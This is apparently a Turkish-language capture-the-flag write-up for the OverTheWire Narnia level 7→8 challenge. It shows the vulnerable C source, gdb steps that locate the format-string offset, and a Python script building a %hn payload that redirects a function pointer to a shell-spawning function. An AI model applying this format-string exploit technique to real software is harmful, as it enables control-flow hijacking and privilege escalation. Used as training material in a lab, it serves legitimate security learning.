# OverTheWire — Narnia Level 7 → 8

> Hedef: `narnia7`'den `narnia8` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: format string (`%hn`) → fonksiyon pointer `ptrf`'i `hackedfunction`'a çevirme.

---

## 1. Bağlantı
```bash
ssh narnia7@narnia.labs.overthewire.org -p 2226
```

## 2. Kaynak
```c
int vuln(const char *format){
    char buffer[128]; int (*ptrf)();
    printf("goodfunction() = %p\n", goodfunction);
    printf("hackedfunction() = %p\n\n", hackedfunction);
    ptrf = goodfunction;
    printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);   // GF, HF, &ptrf BASAR
    sleep(2);
    snprintf(buffer, sizeof buffer, format);              // AÇIK: format = argv[1]
    return ptrf();                                        // ptrf=hackedfunction -> shell
}
// hackedfunction: printf("Way to go!!!!"); setreuid(geteuid(),geteuid()); system("/bin/sh");
```
> ⚠️ buffer **basılmaz** → `%x` çıktısını göremezsin (offset'i gözle bulamazsın). `sleep(2)` var.

## 3. Offset — **gdb ile snprintf stack'inden (VERIFIED = 2)**
```bash
gdb -q -batch /narnia/narnia7 -ex 'break snprintf' -ex 'run AAAA.BBBB' -ex 'x/30wx $esp'
# 0xffffd2e8: 0x0804929d  0xffffd2fc  0x00000080  0xffffd5be
#              [ret]       [buffer]    [size=0x80]  [format]
# 0xffffd2f8: 0x080492ea  0x00000000 ...
#              [vararg1]   [vararg2 = ADDR 0xffffd2fc = BUFFER!]
```
`buffer = 0xffffd2fc`. snprintf vararg'ları: `%1$`=[esp+16], `%2$`=[esp+20]=**buffer**.
→ girdimiz **`%2$`**'de → **offset = 2**. (Walkthrough'taki 6 değil.)

## 4. Yazma — tek `%2$hn` (yüksek yarılar EŞİT)
Program çıktısından: `GF=0x80492ea`, `HF=0x804930f` → **aynı yüksek 16-bit** (`sameHigh=True`).
`ptrf` zaten `goodfunction` → sadece **düşük yarıyı** yaz:
```
lh = hackedfunction & 0xffff         # örn 0x930f
payload = pack(&ptrf) + "%.{lh-4}x" + "%2$hn"   # 4 (adres) + (lh-4) = lh yazılır -> ptrf = HF
```
> Yüksek yarılar farklı olsaydı iki `%hn` (küçük değer önce) gerekirdi.

## 5. Exploit
`&ptrf` programın çıktısından okunur (aynı uzunlukta leak: `%2$hx`, yazmaz):
```python
import subprocess, struct, time, sys, re
def addrs(arg):  # GF, HF, &ptrf'i parse et
    o = subprocess.run([b'/narnia/narnia7', arg], capture_output=True)...
gf,hf,_ = addrs(b'AAAA'); lh = hf & 0xffff
fmt  = ('%%.%dx%%2$hn'%(lh-4)).encode()
fmtx = ('%%.%dx%%2$hx'%(lh-4)).encode()        # aynı uzunluk, yazmaz
_,_,ptrf = addrs(b'BBBB'+fmtx)                 # &ptrf  (örn ffffd318)
exploit = struct.pack('<I',ptrf) + fmt
# sleep(2)'yi say -> komutu ~2.8s sonra besle; env silinmiyor -> cat çalışır
```
Çıktı: `Way to go!!!!` → `uid=14008(narnia8)` → şifre. (Canlı: `GF=80492ea HF=804930f lh=930f PTRF=ffffd318`.)

## 6. Doğrulama
`uid=14008(narnia8)` ✅

## Dersler
| Konu | Not |
|------|-----|
| format string + fp | `%hn` ile fonksiyon pointer'ı ele geçir |
| buffer basılmaz | offset'i **gdb** ile bul (`break snprintf` + stack) → 2 |
| tek yazma | yüksek yarılar eşitse sadece düşük yarıyı yaz (`%2$hn`) |
| adresler hediye | GF/HF/&ptrf basılıyor → tahmin yok |
| `sleep(2)` | komutu yeterince geç besle |

**narnia8 şifresi: `**********`**
